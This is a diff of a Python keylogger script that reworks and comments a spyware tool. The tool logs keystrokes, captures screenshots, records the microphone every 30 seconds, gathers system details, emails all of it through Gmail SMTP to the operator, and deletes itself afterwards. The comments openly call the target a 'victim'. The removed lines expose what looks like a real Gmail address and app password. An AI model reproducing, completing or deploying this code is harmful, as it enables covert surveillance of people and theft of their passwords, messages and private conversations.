@@ -1,28 +1,20 @@
 try:
-    import logging
     import os
     import platform
-    import smtplib
+    import smtplib #for email sending
     import socket
     import threading
-    import sounddevice as sd
-    import time
-    import wave
-    import pyscreenshot
+    import sounddevice as sd #for audio recording 
+    import wave #for audio recording 
     import io
-    import base64
     from email.mime.image import MIMEImage
-    import sounddevice as sd
-    from datetime import datetime
-
-    from pynput.keyboard import Listener as KeyboardListener
-    from pynput.keyboard import Key
-    from pynput.mouse import Listener as MouseListener
+    from datetime import datetime #for tmestamps
+    #email libraries to create annd send emails
     from email import encoders
     from email.mime.base import MIMEBase
     from email.mime.multipart import MIMEMultipart
     from email.mime.text import MIMEText
-    import glob
+#if any required module is missing insttall it using pip
 except ModuleNotFoundError:
     from subprocess import call
     modules = ["pyscreenshot","sounddevice","pynput"]
@@ -30,184 +22,176 @@ except ModuleNotFoundError:
 
 
 finally:
-    EMAIL_ADDRESS = "ranachouchen4@gmail.com"
-    EMAIL_PASSWORD = "hqmw jbgl ssoq ueaf"
-    SEND_REPORT_EVERY = 30 # as in seconds
+    #let's start
+    EMAIL_ADDRESS = "" #here u put ur email address
+    EMAIL_PASSWORD = "" #here the generated password
+    SEND_REPORT_EVERY = 30 # time between the reports that will be sent in seconds
+    #now we're going to startdefining our keylogger class
     class KeyLogger:
         def __init__(self, time_interval, email, password):
-            self.interval = time_interval
-            self.log = "KeyLogger Started..."
-            self.email = email
+            self.interval = time_interval #define the time between reports
+            self.log = "" #variable where we are going to store captured keystrokes
+            self.email = email 
             self.password = password
             self.is_recording = False
-
-        def appendlog(self, string):
+        
+        def appendlog(self, string):#for appending the keystrokes to self.log
             self.log = self.log + string
+        def save_data(self, key): #here the method that captures the keys
+                   # Handle printable characters
+                 current_key = key.name  # 'name' contains the string representation of the key
+                 if current_key == 'space':
+                    current_key = ' '  # Replace 'space' with an actual space
+                 elif current_key == 'impr.ecran':
+                     current_key = "[PRINT_SCREEN]"
+                     self.screenshot()  # Take a screenshot if the 'impr.ecran' key is pressed
+ 
+                 elif len(current_key) > 1:
+                     # Handles special keys like 'enter', 'backspace', etc.
+                    current_key = f'[{current_key}]'
+                 timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S") #capture the exactly time of doing the action 
 
-        def on_move(self, x, y):
-    # Log mouse movement with coordinates
-              try:
-                 timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-                 self.appendlog(f"[{timestamp}] [Mouse Moved] to ({x}, {y})\n")
-              except Exception as e:
-                 self.appendlog(f"Error logging mouse movement: {e}\n")
+                  # Append the log entry with the timestamp
+                 self.appendlog(f"[{timestamp}] : {current_key}\n")
+ 
+                
 
-        def on_click(self, x, y, button, pressed):
-    # Log mouse clicks with button and status
-              try:
-                 timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-                 action = "pressed" if pressed else "released"
-                 self.appendlog(f"[{timestamp}] [Mouse {action}] at ({x}, {y}) with {button}\n")
-              except Exception as e:
-                 self.appendlog(f"Error logging mouse click: {e}\n")
-
-        def on_scroll(self, x, y, dx, dy):
-    # Log mouse scrolling with direction
-             try:
-                timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-                self.appendlog(f"[{timestamp}] [Mouse Scrolled] at ({x}, {y}) with ({dx}, {dy})\n")
-             except Exception as e:
-                self.appendlog(f"Error logging mouse scroll: {e}\n")
-
-        def save_data(self, key):
-            try:
-                current_key = str(key.char)
-            except AttributeError:
-                if key == key.space:
-                    current_key = " "
-                elif key == key.esc:
-                    current_key = "ESC"
-                elif key == Key.print_screen:  # Check for the Print Screen key
-                    current_key = "PRINT_SCREEN"
-                    self.screenshot()  # Trigger the screenshot method
-                else:
-                    current_key = " " + str(key) + " "
-                # Format the log entry with a timestamp
-            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-            self.appendlog(f"[{timestamp}] Key: {current_key}")            
-
-        def send_mail(self, email, password, message, image=None, file_path=None):
-            sender = "ranachouchen4@gmail.com"
-            receiver = "ranachouchen4@gmail.com"
+        def send_mail(self, email, password, message, image=None,  file_data=None): #this is the method that sends logs and screenshots and audio recordings as email attachments
+            sender = ""
+            receiver = ""
 
     # Create the email message
+            from email.mime.multipart import MIMEMultipart
             msg = MIMEMultipart()
             msg['From'] = sender
             msg['To'] = receiver
-            msg['Subject'] = 'Keylogger Report'
+            msg['Subject'] = "from victim's machine"
 
     # Attach the message content with UTF-8 encoding
+            from email.mime.text import MIMEText
             msg.attach(MIMEText(message, 'plain'))
-    # If image is provided, attach it to the email
-            if file_path:
-              try:
-                 with open(file_path, 'rb') as attachment:
-                     part = MIMEBase('application', 'octet-stream')
-                     part.set_payload(attachment.read())
-                     encoders.encode_base64(part)
-                     part.add_header(
-                        'Content-Disposition',
-                         f'attachment; filename="{os.path.basename(file_path)}"'
-                     )
-                     msg.attach(part)
-                     print(f"Attached file: {file_path}")
-              except Exception as e:
-                     print(f"Error attaching file: {e}")
+    # now let's work on audio and images if they are attached
+            from email.mime.base import MIMEBase
+            from email import encoders
+            if file_data:
+                  part = MIMEBase('application', 'octet-stream') #defines an object that will be holding the binary audio  
+                  part.set_payload(file_data.read()) #read the attached binary audio andput the content in part object  
+                  encoders.encode_base64(part) #encodes the binary audio in base64 because binary data like audio can contain characters that might interfere with email transmission protocols
+                  timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S") 
+                  filename = f"audio_recording_{timestamp}.wav"#put in the audio file nme the time for better undrestanding
+                  part.add_header('Content-Disposition', 'attachment', filename=filename) #tell the email client that the audio is an attachment 
+                  msg.attach(part) #addint the part obect in to the msg
             if image:
         # Open the image in binary mode
-                try:
                     image_attachment = MIMEImage(image, _subtype='png')  # Use the image bytes directly
-                    image_attachment.add_header('Content-Disposition', 'attachment', filename='screenshot.png')
+                    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S") 
+                    filename = f"screenshot{timestamp}.png"
+                    image_attachment.add_header('Content-Disposition', 'attachment', filename=filename)
                     msg.attach(image_attachment)
-                except Exception as e:
-                    print(f"Error attaching image: {e}") 
 
-            try:
-                with smtplib.SMTP("smtp.gmail.com", 587) as server:
-                   server.starttls()  # Secure connection
-                   server.login(email, password)
+         
+            with smtplib.SMTP("smtp.gmail.com", 587) as server: #creates a connection with an smtp server to send emails and ensure it closes after the email s sent 
+                   server.starttls()  # upgrades the connection to use TLS for security (cryptography)
+                   server.login(email, password) #loging to the server using the credentials
                    server.sendmail(sender, receiver, msg.as_string())  # Send the email as a string
-                   print("Email sent successfully.")
-            except Exception as e:
-                    print(f"Error occurred: {e}")
         def report(self):
-             if self.log.strip():  # Only send email if there's new log content
+            if self.log.strip(): #ensure the log is not empty 
                  self.send_mail(self.email, self.password, "\n\n" + self.log)
-             self.log = ""  # Reset log after sending
-             timer = threading.Timer(self.interval, self.report)
-             timer.start()
+            self.log = "" #resets the log to avoid sending the same data twice
+            timer = threading.Timer(self.interval, self.report) #sets a time to call the report methos again 
+            timer.start() # starts the timer in the next execution 
 
-        def system_information(self):
-            hostname = socket.gethostname()
-            ip = socket.gethostbyname(hostname)
-            processor = platform.processor()
-            system = platform.system()       
-            machine = platform.machine()
+        def system_information(self): #this method is responsible for collecting and logging detailed infos about the system on which the script is running
+            hostname = socket.gethostname() #get the hostname ogf the machine on the local network  
+            ip = socket.gethostbyname(hostname) #the ip address of the machine in the network 
+            processor = platform.processor() # the name of the processor in the the machine 
+            system = platform.system() # the name of the OS      
+            machine = platform.machine() # the architecture of the machine
             system_info = (
                  f"Hostname: {hostname}\n"
                  f"IP Address: {ip}\n"
                  f"Processor: {processor}\n"
                  f"System: {system}\n"
                  f"Machine: {machine}\n"
-            )
-            self.appendlog(f"\n[System Information]\n{system_info}\n")
+            ) #combine the data
+            self.appendlog(f"\n[System Information]\n{system_info}\n") #   add these infos to the log
         def record_audio(self):
+         from datetime import datetime
+         import  numpy as np
+         from io import BytesIO 
          try:
-            fs = 16000
-            seconds = 10
-            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-            file_path = f"audio_{timestamp}.wav"
-            print(f"Recording audio at {timestamp}...")
-            myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=1)
-            sd.wait() # Wait until recording is finished
-            with wave.open(file_path, 'wb') as obj:
-              obj.setnchannels(1)  # mono
-              obj.setsampwidth(2)  # 2 bytes per sample
-              obj.setframerate(fs)
-              obj.writeframes(myrecording.tobytes())
-            self.appendlog(f"[{timestamp}] Audio recorded: {file_path}")
-            threading.Timer(self.interval, self.record_audio).start()
-    # Send the recorded audio via email
-            self.send_mail(self.email, self.password, 'Microphone Recording', file_path=file_path)
-         except Exception as e: 
-              print(f"Error recording audio:{e}")
+             fs = 44100  # Sample rate
+             seconds = 30  # Duration of recording
+             timestamp = datetime.now().strftime('%Y-%m-%d %H-%M-%S')
+             myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=1) #starts recording 
+             sd.wait()  # Wait until recording is finished
+             myrecording = np.int16(myrecording / np.max(np.abs(myrecording)) * 32767) #normalize the audio 
+
+             # Create an in-memory buffer 
+             buffer = BytesIO() #create the buffer to store the audio
+             with wave.open(buffer, 'wb') as obj: #open the buffer to write on it
+                 obj.setnchannels(1)  # mono
+                 obj.setsampwidth(2)  # 2 bytes per sample
+                 obj.setframerate(fs)
+                 obj.writeframes(myrecording.tobytes())  #Converts the NumPy array myrecording to bytes and writes it to the WAV file
+        
+        # Move the buffer pointer to the beginning before sending so it can be read later
+             buffer.seek(0)
+
+        # Send the recorded audio via email (attachment)
+             self.send_mail(self.email, self.password, 'Microphone Recording', file_data=buffer)
+
+        # Log the action
+             self.appendlog(f"[{timestamp}] Audio recorded and sent via email.")
+        
+        # Recur the audio recording
+             threading.Timer(self.interval, self.record_audio).start() # a timer to record again after the audio is sent
+
+         except Exception as e:
+             print(f"Error recording audio: {e}")
+
         def screenshot(self):
-            img = pyscreenshot.grab()  # Capture screenshot
-            img.show()
-    # Convert the screenshot into bytes and send it as an attachment
-            img_byte_arr = io.BytesIO()
-            img.save(img_byte_arr, format='PNG')  # Save the image as PNG in a byte stream
-            img_byte_arr.seek(0)  # Move cursor to the beginning of the byte stream
+             import pyscreenshot
+             try:
+                 img = pyscreenshot.grab()  # Capture screenshot
 
-    # Now send the email with the screenshot as an attachment
-            self.send_mail(self.email, self.password, 'Screenshot', image=img_byte_arr.getvalue())
-        def run(self):
-            self.record_audio()
+                 # Convert the screenshot into bytes
+                 img_byte_arr = io.BytesIO()
+                 img.save(img_byte_arr, format='PNG')  # Save the image as PNG in a byte stream
+                 img_byte_arr.seek(0)  # Move cursor to the beginning of the byte stream
+
+        # Send the screenshot as an email attachment
+                 self.send_mail(
+                     self.email,
+                     self.password,
+                     'Screenshot captured at {}'.format(datetime.now().strftime("%Y-%m-%d %H:%M:%S")),
+                      image=img_byte_arr.getvalue()
+                )
+
+                 # Log the action
+                 timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                 self.appendlog(f"[{timestamp}] Screenshot captured and sent.")
+             except Exception as e:
+                 print(f"Error capturing screenshot: {e}")
+
+        def run(self): #the main execution point for the script
+            import keyboard
+            keyboard.on_press(self.save_data)#every time a key is pressed the save_data method is triggered 
             self.system_information()
-            keyboard_listener = KeyboardListener(on_press=self.save_data)
-            mouse_listener = MouseListener(
-                 on_move=self.on_move,
-                 on_click=self.on_click,
-                 on_scroll=self.on_scroll
-            )
-            with keyboard_listener as kl, mouse_listener as ml:
-        # Start periodic reporting
-                 self.report()
-
-        # Wait for both listeners to complete
-                 kl.join()
-                 ml.join()
-            if os.name == "nt":
+            self.report()
+            self.record_audio()
+            keyboard.wait() # keeps the program running
+            #this part of the script will do the work of deleting the file when the victim knows about it and stop it 
+            if os.name == "nt": #cheks if the operating system is windows
                 try:
-                    pwd = os.path.abspath(os.getcwd())
+                    pwd = os.path.abspath(os.getcwd()) #gits the path of the current working directory
                     os.system("cd " + pwd)
-                    os.system("TASKKILL /F /IM " + os.path.basename(__file__))
-                    print('File was closed.')
-                    os.system("DEL " + os.path.basename(__file__))
+                    os.system("TASKKILL /F /IM " + os.path.basename(__file__)) # terminates the script's process forcefully
+                    os.system("DEL " + os.path.basename(__file__)) #delete the script file from the system
                 except OSError:
                     print('File is close.')
 
-            else:
+            else: #Unix/Linux
                 try:
                     pwd = os.path.abspath(os.getcwd())
                     os.system("cd " + pwd)
@@ -220,5 +204,3 @@ finally:
 
     keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
     keylogger.run()
-
- 
